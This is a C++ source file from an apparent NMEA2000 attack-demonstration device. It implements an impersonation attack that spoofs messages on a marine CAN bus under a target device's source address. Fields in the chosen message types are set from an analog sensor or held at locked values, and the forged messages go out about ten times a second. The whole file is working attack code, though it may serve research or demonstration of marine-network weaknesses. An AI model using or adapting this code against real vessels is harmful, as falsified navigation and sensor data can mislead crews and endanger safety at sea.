/**
 * @file Attack_Impersonate.cpp
 * @brief Impersonate attack implementation for Attack_Controller
 *
 * This file implements the device impersonation attack, which demonstrates
 * how a malicious device can spoof messages from legitimate NMEA2000 devices
 * by using their source addresses.
 *
 */

#include "Attack_Controller.h"
#include <PGN_Helpers.h>
#include <Sensor.h>

/**
 * @brief Starts an impersonation attack against a target device
 *
 * Initializes the impersonation attack to send spoofed messages appearing
 * to come from the target device. The attack allows modification of specific
 * PGN fields using the analog sensor input.
 *
 * @param targetAddress The source address of the device to impersonate (0-252)
 * @param targetPGN The PGN to spoof (must be an impersonatable PGN)
 */
void Attack_Controller::startImpersonate(uint8_t targetAddress, uint32_t targetPGN) {
    // Stop any existing spam attack first (enforce single attack at a time)
    if (spamAttackActive) {
        stopSpamAttack();
    }

    impersonateActive = true;
    impTargetAddress = targetAddress;
    impTargetPGN = targetPGN;
    impSelectedFieldIndex = 0;
    lastImpTime = 0;

    for (int i = 0; i < MAX_IMP_FIELDS; i++) {
        impFieldLocked[i] = false;
        impFieldLockedValues[i] = 0.0f;
    }
    getFieldRange(impTargetPGN, 0, impFieldMin, impFieldMax);
}

/**
 * @brief Stops the impersonation attack
 *
 * Deactivates the impersonation attack and resets own-sensor tracking.
 * After stopping, the legitimate device's messages will no longer be
 * interfered with by spoofed messages.
 */
void Attack_Controller::stopImpersonate() {
    impersonateActive = false;
    impersonatingOwnSensor = false;
    impOwnSensorIndex = 0;
}

/**
 * @brief Sets the currently selected field index for modification
 *
 * Changes which field in the spoofed PGN message is controlled by the
 * analog sensor input. Also updates the field min/max range accordingly.
 *
 * @param index The field index to select (0-based, max varies by PGN)
 */
void Attack_Controller::setImpSelectedFieldIndex(int index) {
    impSelectedFieldIndex = index;
    getFieldRange(impTargetPGN, impSelectedFieldIndex, impFieldMin, impFieldMax);
}

/**
 * @brief Toggles the lock state for the currently selected field
 *
 * When a field is locked, its value is held constant at the current value
 * rather than being controlled by the sensor input. This allows setting
 * multiple fields to specific values before the attack.
 */
void Attack_Controller::toggleValueLock() {
    // Toggle lock state for the currently selected field
    if (impSelectedFieldIndex < MAX_IMP_FIELDS) {
        if (impFieldLocked[impSelectedFieldIndex]) {
            // Unlock this field
            impFieldLocked[impSelectedFieldIndex] = false;
        } else {
            // Lock this field at current value
            impFieldLocked[impSelectedFieldIndex] = true;
            impFieldLockedValues[impSelectedFieldIndex] = impFieldValue;
        }
    }
}

/**
 * @brief Periodic update for the impersonation attack
 *
 * Called during the main update loop when impersonation is active.
 * Updates at approximately 10Hz to:
 * 1. Read the sensor value (unless field is locked)
 * 2. Map the sensor value to the field's valid range
 * 3. Build and send the spoofed message
 */
void Attack_Controller::updateImpersonate() {
    if (!impersonateActive) return;

    unsigned long now = millis();

    // Update at ~10Hz
    if (now - lastImpTime >= 100) {
        lastImpTime = now;

        // Read sensor value for current field (unless this field is locked)
        bool currentFieldLocked = (impSelectedFieldIndex < MAX_IMP_FIELDS) &&
                                   impFieldLocked[impSelectedFieldIndex];

        if (!currentFieldLocked) {
            int rawValue = valueSensor->getRawValue();
            float normalized = rawValue / 1023.0f;
            impFieldValue = impFieldMin + normalized * (impFieldMax - impFieldMin);
        } else {
            impFieldValue = impFieldLockedValues[impSelectedFieldIndex];
        }

        // Build and send spoofed message with all locked fields applied
        tN2kMsg N2kMsg;
        buildSpoofedMessage(N2kMsg, impTargetPGN, impSelectedFieldIndex, impFieldValue);

        // Send via CAN1 with -1 device index to preserve our spoofed source address
        nmea2000_can1->SendMsg(N2kMsg, -1);
    }
}


/**
 * @brief Builds a list of impersonatable PGNs for a target device
 *
 * Scans the target device's known PGNs and filters for those that have
 * impersonation support (field definitions for spoofing).
 *
 * @param deviceAddress The source address of the device to analyze
 * @return std::vector<uint32_t>& Reference to the internal PGN list
 *
 * @note Only PGNs with parsed fields and specific impersonation support
 * are included. This prevents attempting to spoof unknown message formats.
 */
std::vector<uint32_t>& Attack_Controller::buildImpPGNList(uint8_t deviceAddress) {
    impPGNList.clear();

    DeviceInfo* device = monitor->getDevice(deviceAddress);
    if (device == nullptr) return impPGNList;

    for (auto& pair : device->pgns) {
        uint32_t pgn = pair.first;
        PGNData& pgnData = pair.second;

        // Skip PGNs with no parsed fields
        if (pgnData.fields.empty()) {
            continue;
        }

        // Only include PGNs that have specific impersonation support
        // Uses centralized isImpersonatablePGN from pgn_helpers
        if (isImpersonatablePGN(pgn)) {
            impPGNList.push_back(pgn);
        }
    }

    return impPGNList;
}

/**
 * @brief Counts impersonatable PGNs for a device without modifying state
 *
 * Similar to buildImpPGNList but only returns the count without storing
 * the PGN list. Useful for UI display before actual attack selection.
 *
 * @param deviceAddress The source address of the device to analyze
 * @return int Number of impersonatable PGNs on the device
 */
int Attack_Controller::getImpersonatablePGNCount(uint8_t deviceAddress) {
    // Count impersonatable PGNs without modifying the internal impPGNList
    DeviceInfo* device = monitor->getDevice(deviceAddress);
    if (device == nullptr) return 0;

    int count = 0;
    for (auto& pair : device->pgns) {
        uint32_t pgn = pair.first;
        PGNData& pgnData = pair.second;

        // Skip PGNs with no parsed fields
        if (pgnData.fields.empty()) continue;

        // Only count PGNs that have specific impersonation support
        // Uses centralized isImpersonatablePGN from pgn_helpers
        if (isImpersonatablePGN(pgn)) {
            count++;
        }
    }
    return count;
}


/**
 * @brief Gets the editable field names for a PGN
 *
 * Returns a list of human-readable field names for the specified PGN
 * that can be modified during impersonation.
 *
 * @param pgn The PGN to get field names for
 * @return std::vector<String> List of field names
 *
 * @note Delegates to centralized helper function for consistency
 * across the codebase.
 */
std::vector<String> Attack_Controller::getEditableFieldNames(uint32_t pgn) {
    // Delegate to centralized helper function
    return getPGNFieldNames(pgn);
}

/**
 * @brief Gets the count of editable fields for a PGN
 *
 * Returns the number of fields that can be modified for the specified PGN.
 *
 * @param pgn The PGN to get field count for
 * @return int Number of editable fields
 *
 * @note Delegates to centralized helper function for consistency
 * across the codebase.
 */
int Attack_Controller::getEditableFieldCount(uint32_t pgn) {
    // Delegate to centralized helper function
    return getPGNFieldCount(pgn);
}
